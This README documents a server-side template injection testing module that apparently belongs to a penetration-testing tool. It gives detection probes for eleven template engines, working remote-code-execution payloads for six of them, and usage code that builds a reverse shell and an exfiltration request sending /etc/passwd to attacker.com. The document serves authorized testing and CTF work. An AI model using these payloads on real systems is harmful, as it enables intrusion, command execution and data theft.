# SSTI (Server-Side Template Injection) Module

## Overview

The SSTI module provides automated detection and exploitation of Server-Side Template Injection vulnerabilities across multiple template engines.

## Features

### Template Engine Detection
- **Jinja2** (Python - Flask, Django)
- **Twig** (PHP - Symfony)
- **FreeMarker** (Java)
- **Velocity** (Java)
- **Smarty** (PHP)
- **Mako** (Python)
- **ERB** (Ruby - Rails)
- **Handlebars** (JavaScript)
- **Pebble** (Java)
- **Thymeleaf** (Java)
- **Jade** (JavaScript)

### Detection Techniques
1. **Direct SSTI**: Visible output in responses
2. **Error-Based**: Template engine errors reveal injection
3. **Blind OOB**: Out-of-band callbacks for blind detection

### Exploitation Capabilities
- Automatic RCE payload generation per engine
- Command execution
- File reading
- Reverse shell payloads
- Data exfiltration
- Interactive payload builder

## Usage

### Basic Detection

```python
from app.modules.ssti import SSTITester, InjectionPoint
from app.core.request_handler import RequestHandler

# Initialize
request_handler = RequestHandler()
tester = SSTITester(request_handler)

# Define injection point
injection_point = InjectionPoint(
    parameter="name",
    location="query",
    original_value="test",
    url="https://target.com/greet",
    method="GET"
)

# Test for SSTI
results = await tester.test_injection_point(injection_point)

for result in results:
    if result.is_vulnerable:
        print(f"SSTI found!")
        print(f"Engine: {result.template_engine.value}")
        print(f"Payload: {result.payload}")
        print(f"Confidence: {result.confidence}")
```

### With OOB Detection

```python
from app.modules.ssti import SSTITester, InjectionPoint
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener

# Initialize with OOB listener
request_handler = RequestHandler()
oob_listener = OOBListener()
await oob_listener.start()

tester = SSTITester(request_handler, oob_listener=oob_listener)

# Test for blind SSTI
results = await tester.test_injection_point(injection_point)
```

### Interactive Payload Builder

```python
from app.modules.ssti import SSTIPayloadBuilder, TemplateEngine

# Create builder for specific engine
builder = SSTIPayloadBuilder(TemplateEngine.JINJA2)

# Build command execution payload
cmd_payloads = builder.build_command_payload("whoami")

# Build file read payload
file_payloads = builder.build_file_read_payload("/etc/passwd")

# Build reverse shell payload
shell_payloads = builder.build_reverse_shell_payload("10.10.10.10", 4444)

# Build data exfiltration payload
exfil_payloads = builder.build_data_exfiltration_payload(
    "/etc/passwd",
    "http://attacker.com/exfil"
)

# Get available templates
templates = builder.get_available_templates()

# Customize template
custom_payload = builder.customize_template(
    template_index=0,
    replacements={"COMMAND": "cat /flag.txt"}
)
```

## Detection Payloads

### Jinja2 (Python)
```
{{7*7}}  → 49
{{7*'7'}}  → 7777777
{{config}}  → <Config ...>
```

### Twig (PHP)
```
{{7*7}}  → 49
{{_self}}  → __TwigTemplate...
```

### FreeMarker (Java)
```
${7*7}  → 49
#{7*7}  → 49
```

### Velocity (Java)
```
#set($x=7*7)$x  → 49
```

### Smarty (PHP)
```
{7*7}  → 49
{$smarty.version}  → version number
```

### Mako (Python)
```
${7*7}  → 49
<%=7*7%>  → 49
```

### ERB (Ruby)
```
<%=7*7%>  → 49
<%=7*'7'%>  → 7777777
```

## RCE Payloads

### Jinja2
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Twig
```php
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

### FreeMarker
```java
<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
```

### Velocity
```java
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()
```

### Mako
```python
<%import os%>${os.popen('id').read()}
```

### ERB
```ruby
<%=`id`%>
<%=system('id')%>
```

## Requirements Mapping

- **Requirement 11.1**: Syntax-testing payloads to identify template engine
- **Requirement 11.2**: Template engine identification from rendered output
- **Requirement 11.3**: Engine-specific RCE payloads
- **Requirement 11.4**: Blind SSTI with OOB techniques
- **Requirement 11.5**: Interactive payload builder

## Security Considerations

This module is designed for:
- Authorized penetration testing
- CTF competitions
- Security research in controlled environments

**Never use against systems without explicit authorization.**

## References

- [PortSwigger: Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks: SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
